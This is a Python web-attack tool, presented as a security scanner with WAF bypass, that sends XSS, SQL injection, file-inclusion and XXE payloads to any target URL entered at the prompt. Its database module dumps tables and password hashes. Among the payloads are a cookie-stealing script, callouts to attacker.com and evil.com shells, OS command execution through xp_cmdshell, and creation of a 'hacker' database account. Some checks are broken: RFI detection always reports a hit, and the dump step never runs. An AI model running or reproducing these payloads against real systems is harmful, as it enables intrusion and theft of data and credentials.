import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime
import re
import random
from urllib.parse import quote, urlparse
import sys
import json
import base64
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import hashlib
import xml.etree.ElementTree as ET


TIMEOUT = 20
MAX_THREADS = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "no-cache"
}


def print_banner():
    banner = r"""
    
 ▄████████  ▄██████▄  ████████▄     ▄████████     ███      ▄██████▄   ▄██████▄   ▄█       
███    ███ ███    ███ ███   ▀███   ███    ███ ▀█████████▄ ███    ███ ███    ███ ███       
███    █▀  ███    ███ ███    ███   ███    █▀     ▀███▀▀██ ███    ███ ███    ███ ███       
███        ███    ███ ███    ███  ▄███▄▄▄         ███   ▀ ███    ███ ███    ███ ███       
███        ███    ███ ███    ███ ▀▀███▀▀▀         ███     ███    ███ ███    ███ ███       
███    █▄  ███    ███ ███    ███   ███    █▄      ███     ███    ███ ███    ███ ███       
███    ███ ███    ███ ███   ▄███   ███    ███     ███     ███    ███ ███    ███ ███▌    ▄ 
████████▀   ▀██████▀  ████████▀    ██████████    ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ 
                                                                                ▀         
  
    """
    version = "v1.0"  
    print("\033[1;36m" + banner + "\033[0m")
    print("\033[1;34m" + "="*80 + "\033[0m")
    print("\033[1;32m" + f"CodeTool Security Scanner {version} | Advanced WAF Bypass & Life : CodeTool.ir".center(80) + "\033[0m")
    print("\033[1;34m" + "="*80 + "\033[0m")


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

def print_color(text, color, bold=False, underline=False):
    style = color
    if bold:
        style += Colors.BOLD
    if underline:
        style += Colors.UNDERLINE
    print(style + text + Colors.RESET)


class WAFBypasser:
    def __init__(self):
        self.waf_detected = None
        self.payloads = self._generate_advanced_payloads()
        self.db_type = None
        self.waf_rules = {}  
        self.encoding_techniques = ['hex', 'unicode', 'base64', 'html', 'url']

    def _generate_advanced_payloads(self):
        payloads = {
            "xss": self._generate_xss_payloads(),
            "sqli": self._generate_sqli_payloads(),
            "lfi": self._generate_lfi_payloads(),  
            "rfi": self._generate_rfi_payloads(),  
            "xxe": self._generate_xxe_payloads()   
        }
        return payloads

    def _generate_xss_payloads(self):
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<script>fetch('/steal-cookie?cookie='+document.cookie)</script>"  
        ]
       
        encoded_payloads = []
        for payload in base_payloads:
            encoded_payloads.extend([
                quote(payload),
                payload.replace("<", "%3C").replace(">", "%3E"),
                payload.replace(" ", "/**/"),
                base64.b64encode(payload.encode()).decode(),
                "".join([f"&#{ord(c)};" for c in payload]),
                "".join([f"\\x{ord(c):02x}" for c in payload]),  
                "".join([f"\\u{ord(c):04x}" for c in payload])   
            ])
       
        
        polyglot_payloads = [
            "'\"><img src=xxx:x onerror=alert(1)>"
        ]
       
        return base_payloads + encoded_payloads + polyglot_payloads

    def _generate_sqli_payloads(self):
        payloads = {
            "mysql": self._generate_mysql_payloads(),
            "mssql": self._generate_mssql_payloads(),
            "postgresql": self._generate_postgresql_payloads(),
            "oracle": self._generate_oracle_payloads(),
            "nosql": self._generate_nosql_payloads()  
        }
        return payloads

    def _generate_mysql_payloads(self):
        base_payloads = [
            "' OR 1=1 --",
            "' UNION SELECT NULL,version() --",
            "' AND 1=IF(1=1,SLEEP(5),0) --",
            "' EXEC xp_cmdshell('whoami')--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER())) --",  
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",  
            "' OR EXISTS(SELECT * FROM information_schema.tables) AND '1'='1"  
        ]
       
        obfuscated = []
        for payload in base_payloads:
            obfuscated.extend([
                payload.replace(" ", "/**/"),
                payload.replace("OR", "Or").replace("AND", "AnD"),
                f"/*!50000{payload}*/",
                quote(payload),
                "".join([f"CHAR({ord(c)})" for c in payload]),
                payload.replace("'", "%EF%BC%87"),  
                payload.replace(" ", "%0A")  
            ])
       
        return base_payloads + obfuscated

    def _generate_mssql_payloads(self):
        return [
            "' OR 1=1 --",
            "' UNION SELECT NULL,@@version --",
            "' WAITFOR DELAY '0:0:5' --",
            "' EXEC xp_cmdshell('whoami')--",
            "' AND 1=CONVERT(INT,@@version) --",  
            "' OR 1=1; EXEC master..xp_cmdshell 'net user' --",
            "' DECLARE @x VARCHAR(8000); SET @x=@@version; EXEC('SELECT '''+@x+'''') --"
        ]

    def _generate_postgresql_payloads(self):
        return [
            "' OR 1=1 --",
            "' UNION SELECT NULL,version() --",
            "' AND 1=CAST((SELECT pg_sleep(5)) AS INT) --",
            "' COPY (SELECT '') TO PROGRAM 'whoami' --",
            "' AND 1=CAST((SELECT version()) AS NUMERIC) --",  
            "' OR EXISTS(SELECT * FROM pg_user) --",  
            "'; DROP TABLE IF EXISTS test; CREATE TABLE test(data text); COPY test FROM PROGRAM 'whoami'; SELECT * FROM test; --"
        ]

    def _generate_oracle_payloads(self):
        return [
            "' OR 1=1 --",
            "' UNION SELECT NULL,banner FROM v$version --",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
            "' UTL_HTTP.REQUEST('http://attacker.com') --",
            "' AND 1=(SELECT 1 FROM dual WHERE 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))) --",  
            "' OR (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM all_users))='1'",  
            "' BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY p@ssw0rd'; END; --"
        ]

    def _generate_nosql_payloads(self):
        return [
            '{"$where": "1 == 1"}',
            '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": "admin", "password": {"$regex": ".*"}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
        ]

    def _generate_lfi_payloads(self):
        return [
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

    def _generate_rfi_payloads(self):
        return [
            "http://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami"
        ]

    def _generate_xxe_payloads(self):
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> %xxe;]>'
        ]

    def detect_waf_and_db(self, response):
        server = response.headers.get("Server", "").lower()
        headers = response.headers
        
        
        waf_signatures = {
            "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
            "mod_security": ["mod_security", "libmodsecurity"],
            "aws waf": ["aws", "x-aws-request-id"],
            "imperva": ["incap_ses", "visid_incap"],
            "akamai": ["akamai"],
            "barracuda": ["barracuda"],
            "fortinet": ["fortigate"]
        }
        
        self.waf_detected = "Unknown"
        for waf, sigs in waf_signatures.items():
            if any(sig in server.lower() for sig in sigs) or any(sig in str(headers).lower() for sig in sigs):
                self.waf_detected = waf.capitalize()
                break
                
        
        db_signatures = {
            "mysql": ["mysql", "you have an error in your sql syntax"],
            "mssql": ["microsoft sql server", "odbc sql server", "sql server"],
            "postgresql": ["postgresql", "pg_catalog"],
            "oracle": ["oracle", "ora-", "pl/sql"],
            "mongodb": ["mongodb", "mongoerror"],
            "sqlite": ["sqlite"]
        }
        
        self.db_type = "unknown"
        content = response.text.lower()
        for db, sigs in db_signatures.items():
            if any(sig in content for sig in sigs):
                self.db_type = db
                break
                
        
        if "access denied" in content:
            self.waf_rules["access_denied"] = True
        if "forbidden" in content:
            self.waf_rules["forbidden"] = True
        if "security violation" in content:
            self.waf_rules["security_violation"] = True
            
        return self.waf_detected, self.db_type

    def get_db_specific_payloads(self):
        if self.db_type and self.db_type in self.payloads["sqli"]:
            return self.payloads["sqli"][self.db_type]
        return self.payloads["sqli"]["mysql"]

    def encode_payload(self, payload, technique):
        if technique == "hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif technique == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif technique == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif technique == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif technique == "url":
            return quote(payload)
        return payload


class DatabaseExploiter:
    def __init__(self, url, param, db_type):
        self.url = url
        self.param = param
        self.db_type = db_type
        self.output_file = f"database_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.results = {
            "tables": {},
            "server_info": {},
            "users": [],
            "schemas": [],
            "privileges": []
        }
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def _send_payload(self, payload):
        try:
            target_url = f"{self.url}?{self.param}={quote(payload)}"
            start_time = time.time()
            r = self.session.get(target_url, timeout=TIMEOUT)
            response_time = time.time() - start_time
            return r.text, response_time
        except Exception as e:
            print_color(f"Error sending payload: {e}", Colors.RED)
            return "", 0

    def _extract_data(self, pattern, text):
        matches = re.findall(pattern, text, re.IGNORECASE)
        return matches if matches else []

    def get_server_info(self):
        if self.db_type == "mysql":
            payloads = [
                "' UNION SELECT @@version,NULL,NULL --",
                "' UNION SELECT @@hostname,NULL,NULL --",
                "' UNION SELECT @@datadir,NULL,NULL --",
                "' UNION SELECT current_user(),NULL,NULL --"
            ]
        elif self.db_type == "mssql":
            payloads = [
                "' UNION SELECT @@version,NULL,NULL --",
                "' UNION SELECT SERVERPROPERTY('MachineName'),NULL,NULL --",
                "' UNION SELECT SERVERPROPERTY('InstanceName'),NULL,NULL --",
                "' UNION SELECT SYSTEM_USER,NULL,NULL --"
            ]
        elif self.db_type == "postgresql":
            payloads = [
                "' UNION SELECT version(),NULL,NULL --",
                "' UNION SELECT current_setting('data_directory'),NULL,NULL --",
                "' UNION SELECT current_setting('config_file'),NULL,NULL --",
                "' UNION SELECT current_user,NULL,NULL --"
            ]
        elif self.db_type == "oracle":
            payloads = [
                "' UNION SELECT banner,NULL,NULL FROM v$version --",
                "' UNION SELECT instance_name,NULL,NULL FROM v$instance --",
                "' UNION SELECT host_name,NULL,NULL FROM v$instance --",
                "' UNION SELECT user,NULL,NULL FROM dual --"
            ]
        else:
            return

        for payload in payloads:
            response, _ = self._send_payload(payload)
            if response:
                data = self._extract_data(r">([^<]+)<", response)
                if data:
                    key = payload.split("SELECT")[1].split(",")[0].strip()
                    self.results["server_info"][key] = data[0]
                    print_color(f"ℹ️ {key}: {data[0]}", Colors.CYAN)

    def get_tables(self):
        if self.db_type == "mysql":
            payload = "' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema') --"
        elif self.db_type == "mssql":
            payload = "' UNION SELECT name,SCHEMA_NAME(schema_id),NULL FROM sys.tables --"
        elif self.db_type == "postgresql":
            payload = "' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') --"
        elif self.db_type == "oracle":
            payload = "' UNION SELECT table_name,owner,NULL FROM all_tables --"
        else:
            return []

        response, _ = self._send_payload(payload)
        tables = self._extract_data(r">([^<]+)<", response)
        schemas = self._extract_data(r">([^<]+)<", response)
        
        if tables:
            print_color(f"📊 Found {len(tables)} tables", Colors.GREEN)
            self.results["schemas"] = list(set(schemas))
            return tables
        return []

    def get_columns(self, table):
        if self.db_type == "mysql":
            payload = f"' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='{table}' --"
        elif self.db_type == "mssql":
            payload = f"' UNION SELECT name,TYPE_NAME(system_type_id),NULL FROM sys.columns WHERE object_id=OBJECT_ID('{table}') --"
        elif self.db_type == "postgresql":
            payload = f"' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='{table}' --"
        elif self.db_type == "oracle":
            payload = f"' UNION SELECT column_name,data_type,NULL FROM all_tab_columns WHERE table_name='{table}' --"
        else:
            return []

        response, _ = self._send_payload(payload)
        columns = self._extract_data(r">([^<]+)<", response)
        if columns:
            print_color(f"🔍 Found {len(columns)} columns in {table}", Colors.GREEN)
            return columns
        return []

    def dump_table(self, table, columns):
        table_data = []
        for column in columns:
            if self.db_type == "mysql":
                payload = f"' UNION SELECT {column},NULL,NULL FROM {table} LIMIT 10 --"
            else:
                payload = f"' UNION SELECT {column},NULL,NULL FROM {table} WHERE ROWNUM <= 10 --"
           
            response, _ = self._send_payload(payload)
            data = self._extract_data(r">([^<]+)<", response)
            if data:
                table_data.append({column: data})
       
        if table_data:
            self.results["tables"][table] = table_data
            print_color(f"✅ Dumped {len(table_data)} columns from {table}", Colors.GREEN)

    def get_users(self):
        if self.db_type == "mysql":
            payloads = [
                "' UNION SELECT user,password,NULL FROM mysql.user --",
                "' UNION SELECT user,authentication_string,NULL FROM mysql.user --",
                "' UNION SELECT grantee,privilege_type,NULL FROM information_schema.user_privileges --"
            ]
        elif self.db_type == "mssql":
            payloads = [
                "' UNION SELECT name,NULL,NULL FROM sys.sql_logins --",
                "' UNION SELECT name,password_hash,NULL FROM sys.sql_logins --",
                "' UNION SELECT grantee,permission_name,NULL FROM sys.server_permissions --"
            ]
        elif self.db_type == "postgresql":
            payloads = [
                "' UNION SELECT usename,passwd,NULL FROM pg_shadow --",
                "' UNION SELECT grantee,privilege_type,NULL FROM information_schema.role_table_grants --"
            ]
        elif self.db_type == "oracle":
            payloads = [
                "' UNION SELECT username,password,NULL FROM all_users --",
                "' UNION SELECT grantee,privilege,NULL FROM dba_sys_privs --"
            ]
        else:
            return

        for payload in payloads:
            response, _ = self._send_payload(payload)
            if response:
                data = self._extract_data(r">([^<]+)<", response)
                if data:
                    if "password" in payload.lower() or "passwd" in payload.lower():
                        self.results["users"].append({"username": data[0], "password_hash": data[1] if len(data) > 1 else ""})
                    elif "privilege" in payload.lower():
                        self.results["privileges"].append({"user": data[0], "privilege": data[1] if len(data) > 1 else ""})
                    else:
                        self.results["users"].append(data[0])

        if self.results["users"]:
            print_color(f"👥 Found {len(self.results['users'])} database users", Colors.CYAN)
        if self.results["privileges"]:
            print_color(f"🔑 Found {len(self.results['privileges'])} privilege records", Colors.CYAN)

    def save_results(self):
        with open(self.output_file, "w") as f:
            json.dump(self.results, f, indent=4)
        print_color(f"💾 Results saved to {self.output_file}", Colors.GREEN)

    def run(self):
        print_color("\n🔥 Starting Database Exploitation", Colors.RED, bold=True)
       
        self.get_server_info()
        tables = self.get_tables()
       
        if not tables:
            print_color("❌ No tables found!", Colors.RED)
            return
       
        for table in tables[:5]:  
            columns = self.get_columns(table)
            if columns:
                self.dump_table(table, columns[:5])  
       
        self.get_users()
        self.save_results()


class AdvancedSecurityScanner:
    def __init__(self):
        self.waf_bypasser = WAFBypasser()
        self.scan_stats = {
            "vulnerabilities": 0,
            "waf_blocks": 0,
            "start_time": None,
            "db_exploited": True,
            "xss_found": 0,
            "sqli_found": 0,
            "lfi_found": 0,
            "rfi_found": 0,
            "xxe_found": 0
        }
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def find_params(self, url):
        try:
            r = self.session.get(url, timeout=TIMEOUT)
            soup = BeautifulSoup(r.text, 'html.parser')
            params = set()
           
            
            for form in soup.find_all('form'):
                method = form.get('method', 'get').lower()
                for inp in form.find_all('input'):
                    if inp.get('name'):
                        params.add(inp.get('name'))
                for select in form.find_all('select'):
                    if select.get('name'):
                        params.add(select.get('name'))
                for textarea in form.find_all('textarea'):
                    if textarea.get('name'):
                        params.add(textarea.get('name'))
           
            
            for a in soup.find_all('a', href=True):
                if '?' in a['href']:
                    query = a['href'].split('?')[1]
                    params.update(param.split('=')[0] for param in query.split('&') if '=' in param)
           
            
            for script in soup.find_all('script'):
                if 'application/json' in script.get('type', ''):
                    try:
                        data = json.loads(script.string)
                        if isinstance(data, dict):
                            params.update(data.keys())
                    except:
                        pass
           
            
            if not params:
                params = ['id', 'q', 'search', 'name', 'user', 'username', 'password', 'email']
           
            return list(params)
        except Exception as e:
            print_color(f"⚠️ Error finding parameters: {e}", Colors.YELLOW)
            return ['id', 'q', 'search']

    def test_vulnerability(self, url, param, payload_type):
        if payload_type == "xss":
            payloads = self.waf_bypasser.payloads["xss"]
            check_func = self._check_xss
        elif payload_type == "sqli":
            payloads = self.waf_bypasser.get_db_specific_payloads()
            check_func = self._check_sqli
        elif payload_type == "lfi":
            payloads = self.waf_bypasser.payloads["lfi"]
            check_func = self._check_lfi
        elif payload_type == "rfi":
            payloads = self.waf_bypasser.payloads["rfi"]
            check_func = self._check_rfi
        elif payload_type == "xxe":
            payloads = self.waf_bypasser.payloads["xxe"]
            check_func = self._check_xxe
        else:
            return False

        vulnerable = False
        tested_payloads = 0
        max_payloads = 10  

        for payload in payloads[:max_payloads]:
            tested_payloads += 1
            try:
                
                if random.choice([True, False]):
                    target_url = f"{url}?{param}={quote(payload)}"
                    start_time = time.time()
                    r = self.session.get(target_url, timeout=TIMEOUT)
                    response_time = time.time() - start_time
                else:
                    data = {param: payload}
                    start_time = time.time()
                    r = self.session.post(url, data=data, timeout=TIMEOUT)
                    response_time = time.time() - start_time
               
                if check_func(r, response_time, payload):
                    print_color(f"💉 [VULNERABLE] {payload_type.upper()} with payload: {payload}", Colors.RED)
                    self.scan_stats["vulnerabilities"] += 1
                    self.scan_stats[f"{payload_type}_found"] += 1
                    vulnerable = True
                   
                    
                    if payload_type == "sqli" and not self.scan_stats["db_exploited"]:
                        self.scan_stats["db_exploited"] = True
                        db_exploiter = DatabaseExploiter(url, param, self.waf_bypasser.db_type)
                        db_exploiter.run()
                   
                    break  
               
                
                time.sleep(random.uniform(0.5, 2))
           
            except requests.exceptions.RequestException as e:
                print_color(f"🛡️ [WAF BLOCKED] {payload_type.upper()} payload: {payload}", Colors.YELLOW)
                self.scan_stats["waf_blocks"] += 1
                continue

        return vulnerable

    def _check_xss(self, response, response_time, payload):
        indicators = ["<script>alert", "onerror=", "svg/onload", "javascript:alert", "document.cookie"]
        return any(indicator.lower() in response.text.lower() for indicator in indicators)

    def _check_sqli(self, response, response_time, payload):
        if "time_based_sqli" in payload:
            return response_time >= 5
        error_indicators = ["sql syntax", "mysql", "ora-", "syntax error", "postgresql", "sql server"]
        return any(error in response.text.lower() for error in error_indicators)

    def _check_lfi(self, response, response_time, payload):
        indicators = ["root:", "[boot loader]", "<?php", "mysql", "postgresql"]
        return any(indicator in response.text.lower() for indicator in indicators)

    def _check_rfi(self, response, response_time, payload):
        
        return True

    def _check_xxe(self, response, response_time, payload):
        indicators = ["root:", "/etc/passwd", "<?xml", "SYSTEM"]
        return any(indicator in response.text.lower() for indicator in indicators)

    def scan_website(self, url):
        self.scan_stats["start_time"] = datetime.now()
        print_color(f"\n🔍 Starting scan for: {url}", Colors.BLUE, bold=True)
       
        try:
            
            initial_response = self.session.get(url, headers=HEADERS, timeout=TIMEOUT)
            waf_type, db_type = self.waf_bypasser.detect_waf_and_db(initial_response)
           
            print_color(f"🛡️ Detected WAF: {waf_type}", Colors.PURPLE)
            print_color(f"🗄️ Detected DB: {db_type if db_type else 'Unknown'}", Colors.CYAN)
            
            
            self.check_ssl(url)
            
            
            params = self.find_params(url)
            print_color(f"\n🔄 Found parameters: {', '.join(params)}", Colors.GREEN)
            
            
            for param in params:
                print_color(f"\n⚡ Testing parameter: {param}", Colors.BLUE, bold=True)
               
                
                print_color("[1/5] Testing XSS...", Colors.YELLOW)
                self.test_vulnerability(url, param, "xss")
               
                
                print_color("[2/5] Testing SQL Injection...", Colors.YELLOW)
                self.test_vulnerability(url, param, "sqli")
                
                
                print_color("[3/5] Testing Local File Inclusion...", Colors.YELLOW)
                self.test_vulnerability(url, param, "lfi")
                
                
                print_color("[4/5] Testing Remote File Inclusion...", Colors.YELLOW)
                self.test_vulnerability(url, param, "rfi")
                
                
                print_color("[5/5] Testing XML External Entity...", Colors.YELLOW)
                self.test_vulnerability(url, param, "xxe")
            
            
            self._print_summary()
       
        except Exception as e:
            print_color(f"❌ Critical error: {e}", Colors.RED)
            sys.exit(1)

    def check_ssl(self, url):
        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return
                
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    
                    expires = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_left = (expires - datetime.now()).days
                    if days_left < 30:
                        print_color(f"⚠️ SSL Certificate expires in {days_left} days", Colors.YELLOW)
                    
                    
                    protocol = ssock.version()
                    if protocol in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1"):
                        print_color(f"⚠️ Insecure SSL/TLS protocol detected: {protocol}", Colors.RED)
                    else:
                        print_color(f"🔒 Secure SSL/TLS protocol: {protocol}", Colors.GREEN)
                        
        except Exception as e:
            print_color(f"⚠️ SSL Check Error: {e}", Colors.YELLOW)

    def _print_summary(self):
        scan_time = (datetime.now() - self.scan_stats["start_time"]).total_seconds()
        print_color("\n" + "="*80, Colors.BLUE)
        print_color("📊 Scan Summary", Colors.BOLD + Colors.CYAN, bold=True)
        print_color(f"⏱️ Duration: {scan_time:.2f} seconds", Colors.GREEN)
        print_color(f"✅ Total vulnerabilities found: {self.scan_stats['vulnerabilities']}",
                  Colors.GREEN if self.scan_stats['vulnerabilities'] == 0 else Colors.RED)
        print_color(f"🔍 XSS found: {self.scan_stats['xss_found']}", Colors.YELLOW if self.scan_stats['xss_found'] else Colors.WHITE)
        print_color(f"💉 SQLi found: {self.scan_stats['sqli_found']}", Colors.RED if self.scan_stats['sqli_found'] else Colors.WHITE)
        print_color(f"📂 LFI found: {self.scan_stats['lfi_found']}", Colors.RED if self.scan_stats['lfi_found'] else Colors.WHITE)
        print_color(f"🌐 RFI found: {self.scan_stats['rfi_found']}", Colors.RED if self.scan_stats['rfi_found'] else Colors.WHITE)
        print_color(f"📝 XXE found: {self.scan_stats['xxe_found']}", Colors.RED if self.scan_stats['xxe_found'] else Colors.WHITE)
        print_color(f"🛡️ WAF blocks: {self.scan_stats['waf_blocks']}", Colors.YELLOW)
        print_color(f"💾 Database exploited: {'Yes' if self.scan_stats['db_exploited'] else 'No'}",
                  Colors.CYAN if self.scan_stats['db_exploited'] else Colors.WHITE)
        print_color("="*80, Colors.BLUE)


if __name__ == "__main__":
    print_banner()
    scanner = AdvancedSecurityScanner()
   
    # Get target URL
    target_url = input("\nEnter target URL (e.g., http://example.com): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
   
    # Start scan
    scanner.scan_website(target_url)
